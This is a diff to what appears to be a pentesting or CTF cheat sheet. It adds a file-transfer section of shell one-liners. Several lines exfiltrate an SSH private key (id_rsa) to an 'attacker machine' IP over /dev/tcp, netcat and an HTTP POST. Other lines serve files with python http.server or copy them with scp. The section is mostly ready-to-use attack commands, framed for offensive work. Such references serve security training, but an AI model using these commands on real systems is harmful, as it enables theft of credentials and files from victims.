@@ -620,13 +620,49 @@ ____
 
 ### File Transfer > <a name="bash_upload"></a>Bash Upload
 ###### Upload file over HTTP (require HTTP service running on the attacker machine)
-```
+```html
 bash -c 'echo -e "POST / HTTP/0.9 $(<id_rsa)" > /dev/tcp/10.10.164.167/1337'
 ```
-# Exfiltrate file over TCP# Listen with Netcat on port 1337 + output redirection
+###### Exfiltrate file over TCP# Listen with Netcat on port 1337 + output redirection
+```html
 nc -l -p 1337 > data
 bash -c 'cat id_rsa > /dev/tcp/10.10.164.167/1337' 
-* #### [Bash Download](#bash_download)
-* #### [Netcat](#netcat)
-* #### [Python](#python)
-* #### [SCP](#scp)
+```
+### File Transfer > <a name="bash_download"></a>Bash Download
+###### Send via netcat
+```html
+nc -l -p 1337 < id_rsa
+```
+###### Download file on the other machine
+```html
+bash -c 'cat < /dev/tcp/10.10.164.167/1337 > id_rsa'
+```
+### File Transfer > <a name="netcat"></a>Netcat
+###### Upload payload
+```html
+nc -lnvp 1337
+nc 10.10.164.167 1337 < id_rsa
+```
+###### Download
+```html
+nc 10.10.164.167 1337 < id_rsa
+nc -lnvp 1337 > file_saved
+```
+### File Transfer > <a name="python"></a>Python
+###### Python3 HTTP Server
+```html
+python3 -m http.server 1337
+```
+###### Python2 HTTP Server
+```html
+python -m SimpleHTTPServer 1337
+```
+### File Transfer > <a name="scp"></a>SCP
+###### Upload from local host to remote computer
+```html
+scp id_rsa username@10.10.164.167:~/destination -P 1337
+```
+###### Download from remote computer
+```html
+scp user@10.10.164.167:~/path_to_file file_saved -P 1337
+```
